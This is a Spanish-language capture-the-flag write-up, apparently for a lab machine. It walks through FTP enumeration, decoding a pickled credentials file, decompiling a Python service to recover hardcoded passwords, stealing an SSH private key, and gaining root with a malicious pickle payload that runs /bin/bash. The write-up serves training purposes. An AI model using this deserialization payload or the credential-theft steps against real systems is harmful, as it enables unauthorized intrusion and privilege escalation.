# Conectividad

![image](https://github.com/user-attachments/assets/e34fa562-5479-4cd4-9745-0412fbda8d81)

# Enumeración

```
sudo nmap -sCV -T4 --min-rate 4000 10.10.237.230
Starting Nmap 7.80 ( https://nmap.org ) at 2025-01-22 11:51 GMT
Nmap scan report for 10.10.237.230
Host is up (0.00020s latency).
Not shown: 997 filtered ports
PORT   STATE  SERVICE  VERSION
20/tcp closed ftp-data
21/tcp open   ftp      vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 ftp      ftp            17 May 15  2020 test.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.209.46
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open   ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 04:d5:75:9d:c1:40:51:37:73:4c:42:30:38:b8:d6:df (RSA)
|   256 7f:95:1a:d7:59:2f:19:06:ea:c1:55:ec:58:35:0c:05 (ECDSA)
|_  256 a5:15:36:92:1c:aa:59:9b:8a:d8:ea:13:c9:c0:ff:b6 (ED25519)
MAC Address: 02:5E:41:0A:55:07 (Unknown)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1.90 seconds
```

- 21 / FTP - Anonymous
- 22 / SSH

![image](https://github.com/user-attachments/assets/85578d42-3ce4-4c4c-bdd1-8a4187d834f8)

- Recoguemos el test.txt (vsftpd test file)

Nada importante vamos a seguir enumerando

![image](https://github.com/user-attachments/assets/39fa7acb-6ffb-4e14-a6ca-832ed0cdfc3e)

Encontramos otro arhicvo .creds

![image](https://github.com/user-attachments/assets/5be720ef-a981-44cd-914a-f6b95be0614b)

Tiene toda la pinta de ser un archivo en binario

![image](https://github.com/user-attachments/assets/3b45d316-cd7c-452f-bf73-1a5846299c3b)

Parece ser que nos da un output no muy informativo, pero en la CTF nos dicen que deberemos seguramente utilizar librerias de python y la foto de la CTF es un pepinillo con lo cuál podemos ir tirando por una libreria parecida.

En mi caso desde el mismo cyber chief lo voy a exportar a un archivo .dat y de ahi sacare el output de la libreria pickle

Código que voy a utilizar

```
import pickle
with open(“download.dat”, “rb”) as file:
pickle_data = file.read()
creds = pickle.loads(pickle_data)
print(creds)
```
```
root@ip-10-10-209-46:~# cat pickel.py 
import pickle

with open("download.dat", "rb") as file:

	pickle_data = file.read()

creds = pickle.loads(pickle_data)

print(creds)
root@ip-10-10-209-46:~# python3 pickel.py 
[('ssh_pass15', 'u'), ('ssh_user1', 'h'), ('ssh_pass25', 'r'), ('ssh_pass20', 'h'), ('ssh_pass7', '_'), ('ssh_user0', 'g'), ('ssh_pass26', 'l'), ('ssh_pass5', '3'), ('ssh_pass1', '1'), ('ssh_pass22', '_'), ('ssh_pass12', '@'), ('ssh_user2', 'e'), ('ssh_user5', 'i'), ('ssh_pass18', '_'), ('ssh_pass27', 'd'), ('ssh_pass3', 'k'), ('ssh_pass19', 't'), ('ssh_pass6', 's'), ('ssh_pass9', '1'), ('ssh_pass23', 'w'), ('ssh_pass21', '3'), ('ssh_pass4', 'l'), ('ssh_pass14', '0'), ('ssh_user6', 'n'), ('ssh_pass2', 'c'), ('ssh_pass13', 'r'), ('ssh_pass16', 'n'), ('ssh_pass8', '@'), ('ssh_pass17', 'd'), ('ssh_pass24', '0'), ('ssh_user3', 'r'), ('ssh_user4', 'k'), ('ssh_pass11', '_'), ('ssh_pass0', 'p'), ('ssh_pass10', '1')]
```

Si queremos que la información se vea mil veces mas bonita

```
python3 pickel.py | sed 's/), /)\n/g'
```

Como vemos parece ser que representa un carcater, un numero o letra para coger el usuario y contraseña

![image](https://github.com/user-attachments/assets/71e7749d-7103-44b3-8471-42f6c0cf3901)

gherkin:p1ckl3s_@11_@r0und_th3_w0rld

Estamos dentro: 

![image](https://github.com/user-attachments/assets/0b36d598-1403-4443-acd4-6845ab2d3d56)

Nos encontramos un archivo .pyc : cmd_service.pyc

Nos lo descargamos 

```
scp gherkin@10.10.237.230:/home/gherkin/cmd_service.pyc .
```

Necesitaremos la herramienta uncompyle

```
sudo pip install uncompyle6
```

```
uncompyle6 cmd_service.pyc 
# uncompyle6 version 3.9.2
# Python bytecode version base 3.8.0 (3413)
# Decompiled from: Python 2.7.18 (default, Jan 31 2024, 16:23:13) 
# [GCC 9.4.0]
# Embedded file name: ./cmd_service.py
# Compiled at: 2020-05-14 18:55:16
# Size of source mod 2**32: 2140 bytes
from Crypto.Util.number import bytes_to_long, long_to_bytes
import sys, textwrap, socketserver, string, readline, threading
from time import *
import getpass, os, subprocess
username = long_to_bytes(1684630636)
password = long_to_bytes(2457564920124666544827225107428488864802762356L)

class Service(socketserver.BaseRequestHandler):

    def ask_creds(self):
        username_input = self.receive("'Username: ").strip()
        password_input = self.receive("'Password: ").strip()
        print(username_input, password_input)
        if username_input == username:
            if password_input == password:
                return True
        return False

    def handle(self):
        loggedin = self.ask_creds()
        if not loggedin:
            self.send("'Wrong credentials!")
            return
        self.send("'Successfully logged in!")
        while True:
            command = self.receive("'Cmd: ")
            p = subprocess.Popen(command,
              shell=True, stdout=(subprocess.PIPE), stderr=(subprocess.PIPE))
            self.send(p.stdout.read())

    def send(self, string, newline=True):
        if newline:
            string = string + "'\n"
        self.request.sendall(string)

    def receive(self, prompt=b'> '):
        self.send(prompt, newline=False)
        return self.request.recv(4096).strip()


class ThreadedService(socketserver.ThreadingMixIn, socketserver.TCPServer, socketserver.DatagramRequestHandler):
    pass


def main():
    print("Starting server...")
    port = 7321
    host = "0.0.0.0"
    service = Service
    server = ThreadedService((host, port), service)
    server.allow_reuse_address = True
    server_thread = threading.Thread(target=(server.serve_forever))
    server_thread.daemon = True
    server_thread.start()
    print("Server started on " + str(server.server_address) + "!")
    while True:
        sleep(10)


if __name__ == "__main__":
    main()
```

Este scripts contiene credneciales codificadas como vemos lo coge de la libreria cryto simplemente vamos a ver si lo generamos pidiendolo y ya

Simplemente deberemos escribir un srcipt con las variables y que simplemente desencripte

```
from Crypto.Util.number import long_to_bytes
username = 1684630636
password = 2457564920124666544827225107428488864802762356L
user= long_to_bytes(username)
passwd= long_to_bytes(password)

print (user+”:”+passwd)
```

![image](https://github.com/user-attachments/assets/300ca375-d2c1-4a1c-9522-cfde31e8d5de)

dill:n3v3r_@_d1ll_m0m3nt

![image](https://github.com/user-attachments/assets/e94829d8-b3e5-4927-aefa-95cd51eaece3)

Estamos dentro podemos ya sacar la user flag

Vemos que realmente no es tán fácil podemos hacer cat a archivos pero no tenemos accesos, lo que vamos a hacer es simplemente podriamos quedar una nueva rev shell o leer la id_rsa de ssh y tener mas persistencia

```
cat ~/.ssh/id_rsa
```

Una vez tenemos la id_rsa nos conectamos via ssh

```
chmod 600 id_rsa
```

![image](https://github.com/user-attachments/assets/7b6b87d3-2cad-4ada-9c1f-d793b3dcad95)

Aquí dentro ya podemos sacara la primera flag mucho mas tranquilos

# Escala de privilegios

```
dill@ubuntu-xenial:~$ sudo -l -l
Matching Defaults entries for dill on ubuntu-xenial:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User dill may run the following commands on ubuntu-xenial:

Sudoers entry:
    RunAsUsers: ALL
    RunAsGroups: ALL
    Options: !authenticate
    Commands:
	/opt/peak_hill_farm/peak_hill_farm
```

Vamos a ver que hace eso

![image](https://github.com/user-attachments/assets/7b28d6bb-b46d-484f-a232-af53724b98ed)

Podemos hacerlo mucho más simple y meter un linpeas y ver los archivos modificados

![image](https://github.com/user-attachments/assets/64ea6509-4480-4ed3-bff4-d4ec02173c40)

parece ser que vamos a tener que hacer otro script ajaja

```
import pickle
import os
import base64
class EvilPickle(object):
def __reduce__(self):
return (os.system, (‘/bin/bash’, ))
pickle_data = pickle.dumps(EvilPickle())
payload = base64.b64encode(pickle_data)
print (payload)
```

![image](https://github.com/user-attachments/assets/10480145-b66b-48f5-9032-5f4773af3c90)

![image](https://github.com/user-attachments/assets/10ce0a46-ec04-4e2d-b621-149cf18fce25)

GG!!!!!!!!!!!!!!!!!

HAPPY HACKING

PD: si queremos leer el root.txt

```
find /root/ -name "*root.txt*" -exec cat {} \;
```
